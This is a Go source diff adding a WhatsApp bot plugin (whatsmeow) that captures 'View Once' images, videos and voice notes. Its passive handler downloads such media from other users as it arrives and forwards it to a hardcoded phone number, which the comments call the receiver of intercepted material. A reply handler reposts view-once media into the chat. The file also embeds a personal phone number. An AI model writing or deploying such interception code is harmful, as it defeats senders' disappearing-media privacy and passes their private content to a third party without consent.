@@ -1,0 +1,382 @@
+package plugin
+
+import (
+	"context"
+	"fmt"
+	"log"
+	"os"
+	"os/exec"
+
+	"go.mau.fi/whatsmeow"
+	"go.mau.fi/whatsmeow/binary/proto"
+	"go.mau.fi/whatsmeow/types"
+	"go.mau.fi/whatsmeow/types/events"
+)
+
+// unwrapViewOnce membongkar semua kemungkinan kontainer pembungkus secara berulang
+// (ViewOnce, ViewOnceV2, ViewOnceV2Extension, Ephemeral - bisa bertumpuk, misalnya
+// Ephemeral(ViewOnce(...)) pada chat dengan pesan sementara aktif) dan mengembalikan
+// media View Once yang ditemukan di dalamnya, kalau ada.
+func unwrapViewOnce(msg *proto.Message) (imgMsg *proto.ImageMessage, vidMsg *proto.VideoMessage, audMsg *proto.AudioMessage, isViewOnce bool) {
+	rawMessage := msg
+	for {
+		if rawMessage == nil {
+			return nil, nil, nil, false
+		}
+		if rawMessage.GetViewOnceMessageV2() != nil {
+			rawMessage = rawMessage.GetViewOnceMessageV2().GetMessage()
+			isViewOnce = true
+			continue
+		}
+		if rawMessage.GetViewOnceMessage() != nil {
+			rawMessage = rawMessage.GetViewOnceMessage().GetMessage()
+			isViewOnce = true
+			continue
+		}
+		if rawMessage.GetViewOnceMessageV2Extension() != nil {
+			rawMessage = rawMessage.GetViewOnceMessageV2Extension().GetMessage()
+			isViewOnce = true
+			continue
+		}
+		if rawMessage.GetEphemeralMessage() != nil {
+			rawMessage = rawMessage.GetEphemeralMessage().GetMessage()
+			continue
+		}
+		break
+	}
+
+	if rawMessage == nil {
+		return nil, nil, nil, false
+	}
+
+	if rawMessage.GetImageMessage() != nil {
+		imgMsg = rawMessage.GetImageMessage()
+		if imgMsg.GetViewOnce() {
+			isViewOnce = true
+		}
+	} else if rawMessage.GetVideoMessage() != nil {
+		vidMsg = rawMessage.GetVideoMessage()
+		if vidMsg.GetViewOnce() {
+			isViewOnce = true
+		}
+	} else if rawMessage.GetAudioMessage() != nil {
+		audMsg = rawMessage.GetAudioMessage()
+		if audMsg.GetViewOnce() {
+			isViewOnce = true
+		}
+	}
+
+	return imgMsg, vidMsg, audMsg, isViewOnce
+}
+
+// AntiViewOncePasif mendeteksi pesan View Once dari struktur protobuf mentah secara
+// pasif (begitu masuk, tanpa perlu di-reply) dan meneruskannya ke nomor tujuan.
+func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
+	ctx := context.Background()
+
+	// 1. Kunci nomor tujuan penerima hasil sadapan
+	targetJID, errJID := types.ParseJID("6285161098098@s.whatsapp.net")
+	if errJID != nil {
+		log.Printf("[RVO-Pasif] gagal parse targetJID: %v", errJID)
+		return false
+	}
+
+	if m.Info.IsFromMe || m.Message == nil {
+		return false
+	}
+
+	imgMsg, vidMsg, audMsg, isViewOnce := unwrapViewOnce(m.Message)
+	if !isViewOnce || (imgMsg == nil && vidMsg == nil && audMsg == nil) {
+		return false
+	}
+
+	log.Printf("[RVO-Pasif] View Once terdeteksi dari %s di chat %s (img=%v vid=%v aud=%v)",
+		m.Info.Sender, m.Info.Chat, imgMsg != nil, vidMsg != nil, audMsg != nil)
+
+	// Kirim kode reaksi tanda bot mulai memproses sadapan di background
+	sendReactionRVO(client, m.Info.Chat, m.Info.ID, "🕒")
+
+	var data []byte
+	var err error
+
+	// Proses Download & Meneruskan ke Target Nomor
+	if imgMsg != nil {
+		data, err = client.Download(ctx, imgMsg)
+		if err != nil {
+			log.Printf("[RVO-Pasif] gagal download gambar: %v", err)
+		} else {
+			uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaImage)
+			if errUpload != nil {
+				log.Printf("[RVO-Pasif] gagal upload gambar: %v", errUpload)
+			} else {
+				captionStr := fmt.Sprintf("[RVO PASIF - %s]\n%s", m.Info.PushName, imgMsg.GetCaption())
+				_, errSend := client.SendMessage(ctx, targetJID, &proto.Message{
+					ImageMessage: &proto.ImageMessage{
+						URL:           &uploaded.URL,
+						DirectPath:    &uploaded.DirectPath,
+						MediaKey:      uploaded.MediaKey,
+						FileEncSHA256: uploaded.FileEncSHA256,
+						FileSHA256:    uploaded.FileSHA256,
+						FileLength:    &uploaded.FileLength,
+						Mimetype:      imgMsg.Mimetype,
+						Caption:       &captionStr,
+					},
+				})
+				if errSend != nil {
+					log.Printf("[RVO-Pasif] gagal kirim gambar ke targetJID: %v", errSend)
+				} else {
+					sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+				}
+			}
+		}
+	} else if vidMsg != nil {
+		data, err = client.Download(ctx, vidMsg)
+		if err != nil {
+			log.Printf("[RVO-Pasif] gagal download video: %v", err)
+		} else {
+			uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaVideo)
+			if errUpload != nil {
+				log.Printf("[RVO-Pasif] gagal upload video: %v", errUpload)
+			} else {
+				captionStr := fmt.Sprintf("[RVO PASIF - %s]\n%s", m.Info.PushName, vidMsg.GetCaption())
+				_, errSend := client.SendMessage(ctx, targetJID, &proto.Message{
+					VideoMessage: &proto.VideoMessage{
+						URL:           &uploaded.URL,
+						DirectPath:    &uploaded.DirectPath,
+						MediaKey:      uploaded.MediaKey,
+						FileEncSHA256: uploaded.FileEncSHA256,
+						FileSHA256:    uploaded.FileSHA256,
+						FileLength:    &uploaded.FileLength,
+						Mimetype:      vidMsg.Mimetype,
+						Caption:       &captionStr,
+					},
+				})
+				if errSend != nil {
+					log.Printf("[RVO-Pasif] gagal kirim video ke targetJID: %v", errSend)
+				} else {
+					sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+				}
+			}
+		}
+	} else if audMsg != nil {
+		data, err = client.Download(ctx, audMsg)
+		if err != nil {
+			log.Printf("[RVO-Pasif] gagal download audio: %v", err)
+		} else {
+			fileInput := fmt.Sprintf("temp_pasif_in_%s.ogg", m.Info.ID)
+			fileOutput := fmt.Sprintf("temp_pasif_out_%s.mp3", m.Info.ID)
+
+			err = os.WriteFile(fileInput, data, 0644)
+			if err != nil {
+				log.Printf("[RVO-Pasif] gagal tulis file audio sementara: %v", err)
+			} else {
+				cmd := exec.Command("ffmpeg", "-y", "-i", fileInput, "-vn", "-ar", "44100", "-ac", "2", "-b:a", "128k", fileOutput)
+				if out, errCmd := cmd.CombinedOutput(); errCmd != nil {
+					log.Printf("[RVO-Pasif] ffmpeg gagal (pastikan ffmpeg terinstall & ada di PATH): %v\n%s", errCmd, out)
+				} else {
+					audioData, errRead := os.ReadFile(fileOutput)
+					if errRead != nil {
+						log.Printf("[RVO-Pasif] gagal baca hasil konversi audio: %v", errRead)
+					} else {
+						uploaded, errUpload := client.Upload(ctx, audioData, whatsmeow.MediaAudio)
+						if errUpload != nil {
+							log.Printf("[RVO-Pasif] gagal upload audio: %v", errUpload)
+						} else {
+							isPTT := true
+							mpegMime := "audio/mpeg"
+							_, errSend := client.SendMessage(ctx, targetJID, &proto.Message{
+								AudioMessage: &proto.AudioMessage{
+									URL:           &uploaded.URL,
+									DirectPath:    &uploaded.DirectPath,
+									MediaKey:      uploaded.MediaKey,
+									FileEncSHA256: uploaded.FileEncSHA256,
+									FileSHA256:    uploaded.FileSHA256,
+									FileLength:    &uploaded.FileLength,
+									Mimetype:      &mpegMime,
+									PTT:           &isPTT,
+								},
+							})
+							if errSend != nil {
+								log.Printf("[RVO-Pasif] gagal kirim audio ke targetJID: %v", errSend)
+							} else {
+								sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+							}
+						}
+					}
+				}
+				os.Remove(fileInput)
+				os.Remove(fileOutput)
+			}
+		}
+	}
+
+	return true // Berhasil dicegat, return true agar di handler.go berhenti (tidak double-proses)
+}
+
+// AntiViewOnceOnReply dipanggil otomatis dari handler.go setiap ada reply.
+// Kalau pesan yang dibalas adalah View Once, media-nya otomatis diunduh & dikirim ulang
+// sebagai balasan di chat yang sama (grup maupun pribadi) - tanpa perlu ketik ".rvo".
+// Selalu mengirim reaksi 🕒/✅/❌ supaya semua orang di chat itu melihat jelas bahwa
+// bot sedang memproses, bukan diam-diam menyadap.
+func AntiViewOnceOnReply(client *whatsmeow.Client, m *events.Message) bool {
+	ctx := context.Background()
+
+	if m.Message.GetExtendedTextMessage() == nil || m.Message.GetExtendedTextMessage().GetContextInfo() == nil {
+		return false
+	}
+	quotedMessage := m.Message.GetExtendedTextMessage().GetContextInfo().GetQuotedMessage()
+	if quotedMessage == nil {
+		return false
+	}
+
+	imgMsg, vidMsg, audMsg, isViewOnce := unwrapViewOnce(quotedMessage)
+	if !isViewOnce || (imgMsg == nil && vidMsg == nil && audMsg == nil) {
+		return false
+	}
+
+	log.Printf("[RVO-Reply] View Once dibalas oleh %s di chat %s (img=%v vid=%v aud=%v)",
+		m.Info.Sender, m.Info.Chat, imgMsg != nil, vidMsg != nil, audMsg != nil)
+
+	sendReactionRVO(client, m.Info.Chat, m.Info.ID, "🕒")
+
+	fail := func(label string, err error) {
+		log.Printf("[RVO-Reply] %s: %v", label, err)
+		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "❌")
+	}
+
+	var data []byte
+	var err error
+
+	if imgMsg != nil {
+		data, err = client.Download(ctx, imgMsg)
+		if err != nil {
+			fail("gagal download gambar", err)
+			return true
+		}
+		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaImage)
+		if errUpload != nil {
+			fail("gagal upload gambar", errUpload)
+			return true
+		}
+		_, errSend := client.SendMessage(ctx, m.Info.Chat, &proto.Message{
+			ImageMessage: &proto.ImageMessage{
+				URL:           &uploaded.URL,
+				DirectPath:    &uploaded.DirectPath,
+				MediaKey:      uploaded.MediaKey,
+				FileEncSHA256: uploaded.FileEncSHA256,
+				FileSHA256:    uploaded.FileSHA256,
+				FileLength:    &uploaded.FileLength,
+				Mimetype:      imgMsg.Mimetype,
+				Caption:       imgMsg.Caption,
+			},
+		})
+		if errSend != nil {
+			fail("gagal kirim gambar", errSend)
+			return true
+		}
+	} else if vidMsg != nil {
+		data, err = client.Download(ctx, vidMsg)
+		if err != nil {
+			fail("gagal download video", err)
+			return true
+		}
+		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaVideo)
+		if errUpload != nil {
+			fail("gagal upload video", errUpload)
+			return true
+		}
+		_, errSend := client.SendMessage(ctx, m.Info.Chat, &proto.Message{
+			VideoMessage: &proto.VideoMessage{
+				URL:           &uploaded.URL,
+				DirectPath:    &uploaded.DirectPath,
+				MediaKey:      uploaded.MediaKey,
+				FileEncSHA256: uploaded.FileEncSHA256,
+				FileSHA256:    uploaded.FileSHA256,
+				FileLength:    &uploaded.FileLength,
+				Mimetype:      vidMsg.Mimetype,
+				Caption:       vidMsg.Caption,
+			},
+		})
+		if errSend != nil {
+			fail("gagal kirim video", errSend)
+			return true
+		}
+	} else if audMsg != nil {
+		data, err = client.Download(ctx, audMsg)
+		if err != nil {
+			fail("gagal download audio", err)
+			return true
+		}
+
+		fileInput := fmt.Sprintf("temp_reply_in_%s.ogg", m.Info.ID)
+		fileOutput := fmt.Sprintf("temp_reply_out_%s.mp3", m.Info.ID)
+		defer os.Remove(fileInput)
+		defer os.Remove(fileOutput)
+
+		if err := os.WriteFile(fileInput, data, 0644); err != nil {
+			fail("gagal tulis file audio sementara", err)
+			return true
+		}
+
+		cmd := exec.Command("ffmpeg", "-y", "-i", fileInput, "-vn", "-ar", "44100", "-ac", "2", "-b:a", "128k", fileOutput)
+		if out, errCmd := cmd.CombinedOutput(); errCmd != nil {
+			log.Printf("[RVO-Reply] ffmpeg gagal (pastikan ffmpeg terinstall): %v\n%s", errCmd, out)
+			sendReactionRVO(client, m.Info.Chat, m.Info.ID, "❌")
+			return true
+		}
+
+		audioData, errRead := os.ReadFile(fileOutput)
+		if errRead != nil {
+			fail("gagal baca hasil konversi audio", errRead)
+			return true
+		}
+
+		uploaded, errUpload := client.Upload(ctx, audioData, whatsmeow.MediaAudio)
+		if errUpload != nil {
+			fail("gagal upload audio", errUpload)
+			return true
+		}
+
+		isPTT := true
+		_, errSend := client.SendMessage(ctx, m.Info.Chat, &proto.Message{
+			AudioMessage: &proto.AudioMessage{
+				URL:           &uploaded.URL,
+				DirectPath:    &uploaded.DirectPath,
+				MediaKey:      uploaded.MediaKey,
+				FileEncSHA256: uploaded.FileEncSHA256,
+				FileSHA256:    uploaded.FileSHA256,
+				FileLength:    &uploaded.FileLength,
+				Mimetype:      StringPtr("audio/mpeg"),
+				PTT:           &isPTT,
+			},
+		})
+		if errSend != nil {
+			fail("gagal kirim audio", errSend)
+			return true
+		}
+	}
+
+	sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+	return true
+}
+
+func sendReactionRVO(client *whatsmeow.Client, chat types.JID, msgID string, emoji string) {
+	ctx := context.Background()
+	remoteJidStr := chat.String()
+	fromMe := false
+
+	_, err := client.SendMessage(ctx, chat, &proto.Message{
+		ReactionMessage: &proto.ReactionMessage{
+			Key: &proto.MessageKey{
+				RemoteJID: &remoteJidStr,
+				FromMe:    &fromMe,
+				ID:        &msgID,
+			},
+			Text:              &emoji,
+			SenderTimestampMS: new(int64),
+		},
+	})
+	if err != nil {
+		log.Printf("[RVO] gagal kirim reaksi %q: %v", emoji, err)
+	}
+}
